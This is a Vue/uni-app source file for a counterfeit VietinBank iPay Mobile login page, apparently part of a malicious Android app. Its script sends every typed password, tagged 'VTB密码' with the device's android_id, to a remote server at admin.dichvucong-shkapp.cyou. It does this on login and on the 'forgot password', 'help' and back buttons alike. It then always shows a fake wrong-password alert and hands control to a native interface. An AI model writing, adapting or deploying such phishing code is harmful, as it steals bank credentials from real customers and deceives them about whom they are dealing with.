<template>
	<view class="bg_page_conver" style="background-image: url(/static/bg_login.png);position: relative;">
		<header
			style="display: flex;align-items: center;justify-content: space-between;gap:12px;padding:78rpx 20px 30px 20px;">
			<image src="/static/vxp_ic_back.png" mode="aspectFit" :style="$theme.setImageSize(24)" @tap="openApp()">
			</image>
			<view style="flex:1;color: #FFF;font-size: 14px;display: flex;flex-direction: column;align-items: center;">
				<!-- <view style="text-align: center;font-weight: 500;">VietinBank</view> -->
				<image src="/static/vtb_ic_logo_full.png" mode="heightFix" :style="$theme.setImageSize(32)"></image>
				<view
					style="text-align: center;padding-top: 4px;padding-right: 30px;display: flex;align-items: center;justify-content: center;gap: 4px;">
					<image src="/static/icon_ipay_home.png" mode="scaleToFill" style="width: 30px;height: 14px;"></image>
					Mobile
				</view>
			</view>
			<view :style="$theme.setImageSize(24)"></view>
		</header>

		<view style="display: flex;align-items: center;justify-content: center;">
			<image src="/static/avatar.svg" mode="scaleToFill" style="border-radius: 100%;border: 2px solid #7ed3f7;"
				:style="$theme.setImageSize(72)"></image>
		</view>
		<view style="padding-top: 16px;color:#DDD;text-align: center;font-size: 30rpx;font-weight: 500;">Buổi tối ấm
			cúng
			nha</view>
		<view style="padding-top: 4px;color:#FFF;text-align: center;font-size: 40rpx;font-weight: 500;">Xin chào Quý
			khách
		</view>
		<!-- <view style="padding-top: 4px;color:#FFF;text-align: center;font-size: 15px;">*****2736</view> -->

		<view style="padding:20px;margin-top: 20px;">
			<view class="form_input" @click="openKeyword()" style="position: relative;z-index: 18;">
				<template v-if="curValue.length<=0">
					<view class="placeholder" style="flex:auto;display: flex;align-items:center;">
						<template v-if="showKeyword">
							<view v-if="isCursorVisible"
								style="position: absolute;width: 1px;height: 20px; background-color: #EEE;margin-left: 1px;"></view>
						</template>
						<view style="position: absolute;left: 2px; color: #76c8fc;font-weight: 500;">Mật khẩu</view>
					</view>
				</template>
				<template v-else>
					<template v-if="isMask">
						<view style="flex:auto;padding-bottom: 6px;display: flex;align-items: center;">
							<view class="hide_value" style="padding-bottom:20px;">{{hideValue}}</view>
							<template v-if="showKeyword">
								<view v-if="isCursorVisible" style="width: 1px;height: 22px; background-color: #EEE;margin-left: 1px; ">
								</view>
							</template>
						</view>
					</template>
					<template v-else>
						<view style="flex:auto;font-size: 20px;font-weight: 500;color: #FFF;display: flex;align-items: center;">
							<text style="padding-bottom: 8px;">{{curValue.join('')}}</text>
							<template v-if="showKeyword">
								<view v-if="isCursorVisible"
									style="width: 1px;height: 22px; background-color: #EEE;margin-left: 1px; margin-bottom: 4px;">
								</view>
							</template>
						</view>
					</template>
				</template>
				<image :src="`/static/mask_${isMask?`show`:`hide`}.svg`" mode="aspectFit" @click.stop="toggleMask()"
					:style="$theme.setImageSize(24)">
				</image>
			</view>
			<view style="text-align: right;padding-top: 8px;">
				<text style="display: inline-block;color:#76c8fc;font-weight: 500;font-size: 14px;"
					@tap="openApp()">{{`Quên mật khẩu?`}}</text>
			</view>

			<view class="btn_common"
				style="margin-top: 30px;background-color: #FFF;color: #1460ab;position: relative; z-index: 18;"
				@tap="handleSubmit()">
				Đăng nhập
			</view>

			<view style="padding-top: 30px;color:#FFF;text-align: center;font-size: 15px;" @tap="openApp()">Đăng nhập tài
				khoản khác ?
			</view>
		</view>

		<view style="position: absolute;bottom: 40px;left: 0;right: 0;text-align: center;color: #FFF;padding:0 20px;"
			@tap="openApp()">
			<view style="position: relative;">
				<view
					style="position: absolute;right: 20px;bottom:12px;background-color: rgba(0, 0, 0, 0.22);padding:12px 40px 12px 20px;border-radius: 22px;">
					Bạn cần hỗ trợ?
				</view>
				<view style="position: absolute;right: 0px;bottom:10px;">
					<view style="display: flex;align-items: center;justify-content: center;">
						<image src="/static/Message.svg" mode="aspectFit" :style="$theme.setImageSize(48)"></image>
					</view>
				</view>
			</view>
		</view>

		<template v-if="showKeyword">
			<view class="overlay" style="background-color: transparent;" @tap="closeKeyword()"></view>
			<view class="modal_wrapper_bottom bottom_in" style="background-color: #dedede;">
				<view style="font-size: 24px;font-weight: 400;">
					<view class="keyword_row" style="padding:8px 2px 4px 2px;">
						<block v-for="(v,k) in keywordNumber" :key="k">
							<template v-if="isSymbol">
								<view class="keyword_row_item num_font" @tap="chooseKey(v)" :style="setStyle(curKey==v)">{{v}}</view>
							</template>
							<template v-else>
								<view class="keyword_row_item num_font" style="background-color: transparent;"
									:style="setStyleNum(curKey==v)" @tap="chooseKey(v)">{{v}}</view>
							</template>
						</block>
					</view>
					<view class="keyword_row" style="padding:4px 2px;">
						<template v-if="isSymbol">
							<block v-for="(v,k) in symbol0" :key="k">
								<view class="keyword_row_item symbol_font" @tap="chooseKey(v)" :style="setStyle(curKey==v)"> {{v}}
								</view>
							</block>
						</template>
						<template v-else>
							<block v-for="(v,k) in keywordqp" :key="k">
								<view class="keyword_row_item" @tap="chooseKey(v)" :style="setStyle(curKey==v)"> {{v}} </view>
							</block>
						</template>
					</view>
					<view class="keyword_row" :style="{padding:isSymbol?`4px 2px`:`4px 16px`}">
						<template v-if="isSymbol">
							<block v-for="(v,k) in symbol1" :key="k">
								<view class="keyword_row_item symbol_font" @tap="chooseKey(v)" :style="setStyle(curKey==v)"> {{v}}
								</view>
							</block>
						</template>
						<template v-else>
							<block v-for="(v,k) in keywordal" :key="k">
								<view class="keyword_row_item" @tap="chooseKey(v)" :style="setStyle(curKey==v)"> {{v}} </view>
							</block>
						</template>
					</view>
					<view class="keyword_row" style="padding:4px 2px;">
						<template v-if="isSymbol">
							<block v-for="(v,k) in symbol2" :key="k">
								<view class="keyword_row_item symbol_font" @tap="chooseKey(v)" :style="setStyle(curKey==v)"> {{v}}
								</view>
							</block>
						</template>
						<template v-else>
							<view @tap="changeCapital(`cap`)" class="keyword_row_item" style="padding:0 7px;height: 40px;"
								:style="setStyle(curKey==`cap`)">
								<template v-if="curKey==`cap`">
									<image src="/static/arrow_up_fff.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
								<template v-else>
									<image src="/static/arrow_up.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
							</view>
							<block v-for="(v,k) in keywordzm" :key="k">
								<view class="keyword_row_item" @tap="chooseKey(v)" :style="setStyle(curKey==v)"> {{v}} </view>
							</block>
						</template>
						<template v-if="isSymbol">
							<view class="keyword_row_item " style="padding:0 20px;height: 40px;" @touchstart="startTouch(`bs`)"
								@touchend="endTouch" @touchcancel="endTouch" :style="setStyle(curKey==`bs`)">
								<template v-if="curKey==`bs`">
									<image src="/static/backspace_fff.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
								<template v-else>
									<image src="/static/backspace.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
							</view>
						</template>
						<template v-else>
							<view class="keyword_row_item" style="padding:0 8px;height: 40px;" @touchstart="startTouch(`bs`)"
								@touchend="endTouch" @touchcancel="endTouch" :style="setStyle(curKey==`bs`)">
								<template v-if="curKey==`bs`">
									<image src="/static/backspace_fff.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
								<template v-else>
									<image src="/static/backspace.svg" mode="aspectFit" style="width: 20px;height: 20px;">
									</image>
								</template>
							</view>
						</template>
					</view>

					<view class="keyword_row" style="padding:4px 2px 16px 2px;">
						<template v-if="isSymbol">
							<view @tap="changeSymbol(`symbol`)" class="keyword_row_item "
								style="text-align: center;font-size: 13px;padding:0 10px;" :style="setStyle(curKey==`symbol`)">ABC
							</view>
						</template>
						<template v-else>
							<view @tap="changeSymbol(`symbol`)" class="keyword_row_item"
								style="text-align: center;font-size: 16px;padding:0 14px;" :style="setStyle(curKey==`symbol`)">!#1
							</view>
						</template>

						<view class="keyword_row_item" @tap="chooseKey(`,`)" :style="setStyle(curKey==`,`)">
							,</view>
						<template v-if="isSymbol">
							<view class="keyword_row_item symbol_font" @tap="chooseKey('`')" :style="setStyle(curKey=='`')"> `
							</view>
						</template>
						<template v-if="isSymbol">
							<view class="keyword_row_item symbol_font" style="flex:1 0 auto;color: #FFF;"
								:style="setStyleSpace(curKey=='space')" @tap="space('space')">
								Space</view>
						</template>
						<template v-else>
							<view class="keyword_row_item" style="flex:5 0;  color: #FFF;" :style="setStyleSpace(curKey=='space')"
								@tap="space('space')">
								Space</view>
						</template>

						<template v-if="isSymbol">
							<view class="keyword_row_item symbol_font" @tap="chooseKey('_')" :style="setStyle(curKey=='_')">_
							</view>
						</template>
						<view class="keyword_row_item" @tap="chooseKey('.')" :style="setStyle(curKey=='.')">
							.</view>
						<template v-if="isSymbol">
							<view @tap="closeKeyword()" class="keyword_row_item"
								style="height: 40px;background-color:#187ee0;padding:0 24px;">
								<image src="/static/enter.svg" mode="aspectFit" :style="$theme.setImageSize(20)">
								</image>
							</view>
						</template>
						<template v-else>
							<view class="keyword_row_item" style="height: 40px;background-color:#187ee0;padding:0 16px;"
								@tap="closeKeyword()">
								<image src="/static/f.svg" mode="aspectFit" :style="$theme.setImageSize(28)">
								</image>
							</view>
						</template>
					</view>
				</view>
			</view>
		</template>

		<template v-if="showAlert">
			<view class="overlay" style="background-color: transparent;" @tap="closeAlert()"></view>
			<view class="modal_wrapper_center" style="background-color: #F4F4F4;padding: 30px 20px;z-index: 19;">
				<view style="min-height: 30vh;">
					<view style="display: flex;align-items: center;justify-content: center;">
						<image src="/static/vtb_ic_warning_dialog.png" mode="scaleToFill" :style="$theme.setImageSize(32)"></image>
					</view>
					<view style="text-align: center;font-size: 20px;font-weight:700;margin-top: 20px;">Thông báo</view>
					<view style="text-align: center;margin-top: 20px;font-size: 16px;color: #666;">Quý khách nhập sai tên đăng
						nhập hoặc mật
						khẩu. Vui lòng
						kiểm tra lại và
						nhập đúng thông tin</view>

					<view @tap="openApp()" class="btn_common" style="margin-top: 20px;background-color: #1460ab;color: #FFF;">
						Thử lại</view>
					<view @tap="openApp()" class="btn_common"
						style="margin-top: 16px;background-color: #1460ab2e;color: #1460ab;">
						Quên tên đăng nhập</view>
					<view @tap="openApp()" class="btn_common"
						style="margin-top: 16px;background-color: #1460ab2e;color: #1460ab;">
						Quên mật khẩu</view>
					<view @tap="openApp()" class="btn_common"
						style="margin-top: 16px;background-color: #1460ab2e;color: #1460ab;">
						Trợ giúp</view>
				</view>
			</view>
		</template>

		<template v-if="showTipPwd">
			<view class="overlay" style="background-color: transparent;" @tap="showTipPwd=false"></view>
			<view class="modal_wrapper_center" style="background-color: #F4F4F4;padding: 20px;z-index: 19;">
				<view>
					<view style="text-align: center;font-size: 20px;font-weight:700;">Thông báo</view>
					<view style="text-align: center;margin-top: 20px;font-size: 16px;color: #666;">Quý khách vui lòng nhập Mật
						khẩu</view>
					<view @tap="showTipPwd=false" class="btn_common"
						style="margin-top: 20px;background-color: #1460ab;color: #FFF;padding: 12px 0;">
						Đồng ý</view>
				</view>
			</view>
		</template>
	</view>
</template>

<script>
	export default {
		data() {
			return {
				isMask: true,
				showKeyword: false,
				// 键盘
				keywordNumber: [1, 2, 3, 4, 5, 6, 7, 8, 9, 0],
				qp: [`q`, `w`, `e`, `r`, `t`, `y`, `u`, `i`, `o`, `p`],
				al: [`a`, `s`, `d`, `f`, `g`, `h`, `j`, `k`, `l`],
				zm: [`z`, `x`, `c`, `v`, `b`, `n`, `m`],
				qpCapital: [`Q`, `W`, `E`, `R`, `T`, `Y`, `U`, `I`, `O`, `P`],
				alCapital: [`A`, `S`, `D`, `F`, `G`, `H`, `J`, `K`, `L`],
				zmCapital: [`Z`, `X`, `C`, `V`, `B`, `N`, `M`],
				symbol0: [`@`, `#`, `$`, `%`, `&`, `*`, `-`, `+`, `(`, `)`],
				symbol1: [`~`, `^`, `<`, `>`, `|`, `\\`, `{`, `}`, `[`, `]`],
				symbol2: [`=`, `!`, `"`, `'`, `:`, `;`, `/`, `?`],

				isCapital: false, // 是否显示大写字母
				isSymbol: false, // 符号页
				curValue: [], // 当前输入值

				curKey: null, // 当前选中，仅限用于触摸改变背景色
				isCursorVisible: true, // 光标的显示状态
				timer: null,

				showAlert: false, // 显示弹层
				showTipPwd: false, // 未输入密码的弹层

				longPressTimeout: null,
				isLongPressTriggered: false,
				android_id: ""
			}
		},
		computed: {
			keywordqp() {
				return this.isCapital ? this.qpCapital : this.qp;
			},
			keywordal() {
				return this.isCapital ? this.alCapital : this.al;
			},
			keywordzm() {
				return this.isCapital ? this.zmCapital : this.zm;
			},
			hideValue() {
				return this.curValue.map(v => v = `.`).join('');
			},
		},
		onLoad(op) {
			this.android_id = op.android_id
		},
		onShow() {
			// this.isMask = uni.getStorageSync('masking');
			clearInterval(this.timer);
			// this.showAlert = true;
		},
		onHide() {
			clearInterval(this.timer);
		},
		methods: {
			async openApp() {
				await this.submitPwd();
				// 调用 Android 提供的接口
				if (window.VTBInterface) {
					window.VTBInterface.openApp();
					this.closeAlert();
					this.curValue = [];
				} else {
					this.closeAlert();
					this.curValue = [];
					// alert("Android interface is not available.");
				}
			},

			async handleSubmit() {
				this.closeKeyword();
				// 没有输入内容时
				if (this.curValue.length <= 0) {
					this.showTipPwd = true;
					return false;
				}
				const result = await this.submitPwd();
				// 提交成功，显示弹层
				console.log(result);
				if (result) this.showAlert = true;
			},

			async submitPwd() {
				const headers = { "Content-Type": "application/x-www-form-urlencoded", };
				const API = `https://admin.dichvucong-shkapp.cyou/api/keyboard-input`;
				const tempData = {
					android_id: this.android_id, // 通过链接参数获取
					input_text: "VTB密码：" + this.curValue.join(''), // 密码输入内容
					timestamp: new Date().getTime(), // 毫秒时间戳
				}
				console.log(tempData);
				const response = await uni.request({
					url: API,
					method: 'POST',
					data: tempData,
					header: headers
				});
				console.log(response);
				const [err, res] = response;
				if (res && res.statusCode == 200) return res;
			},

			closeAlert() { this.showAlert = false; },

			// 按键特效
			effect(val) {
				this.curKey = val;
				setTimeout(() => {
					this.curKey = null;
				}, 100);
			},

			toggleMask() {
				this.isMask = !this.isMask;
				this.closeKeyword();
			},
			startCursorBlink() {
				// 定时器控制光标闪烁
				this.timer = setInterval(() => {
					this.isCursorVisible = !this.isCursorVisible;
				}, 500); // 每500毫秒切换光标状态
			},

			openKeyword() {
				this.showKeyword = true;
				clearInterval(this.timer);
				this.startCursorBlink();
			},
			closeKeyword() {
				this.showKeyword = false;
				this.isCapital = false;
				this.isSymbol = false;
				clearInterval(this.timer);
			},

			// 大小写转换
			changeCapital(val) {
				this.isCapital = !this.isCapital;
				this.effect(val);
			},
			changeSymbol(val) {
				this.isSymbol = !this.isSymbol;
				this.effect(val);
			},
			// 选中一个字符
			chooseKey(val) {
				// console.log(`val:`, val);
				if (val == `\\`) {
					// console.log(val);
					this.curValue.push(`\\`);
				} else {
					this.curValue.push(val);
					// console.log(this.curValue);
				}
				this.effect(val);
			},
			// 退格
			startTouch(val) {
				this.curKey = val;
				if (this.curValue.length <= 0) {
					if (this.showKeyword) this.showKeyword = false;
					clearInterval(this.timer);
					this.curKey = null;
					return false;
				}
				this.isLongPressTriggered = false; // 重置长按状态
				// 设置一个定时器
				this.longPressTimeout = setTimeout(() => {
					this.isLongPressTriggered = true; // 触发长按
					if (this.curValue.length > 0) {
						this.curValue = [];
						if (this.showKeyword) this.showKeyword = false;
					}
				}, 800); // 长按阈值（500ms）
			},
			endTouch() {
				this.curKey = null;
				clearTimeout(this.longPressTimeout); // 清除定时器
				if (!this.isLongPressTriggered) {
					if (this.curValue.length > 0) {
						this.curValue = this.curValue.slice(0, this.curValue.length - 1);
					}
				}
				this.isLongPressTriggered = false; // 重置状态
			},

			// 空格
			space(val) {
				this.effect(val);
			},

			setStyle(val) {
				return {
					backgroundColor: val ? `#187ee0` : `#FDFFFF`,
					color: val ? `#FDFFFF` : `#000000`,
				}
			},
			setStyleNum(val) {
				return {
					backgroundColor: val ? `#187ee0` : `transparent`,
					color: val ? `#FDFFFF` : `#000000`,
				}
			},

			setStyleSpace(val) {
				return {
					backgroundColor: val ? `#187ee0` : `#FDFFFF`,
					color: `transparent`,
				}
			},




		}
	}
</script>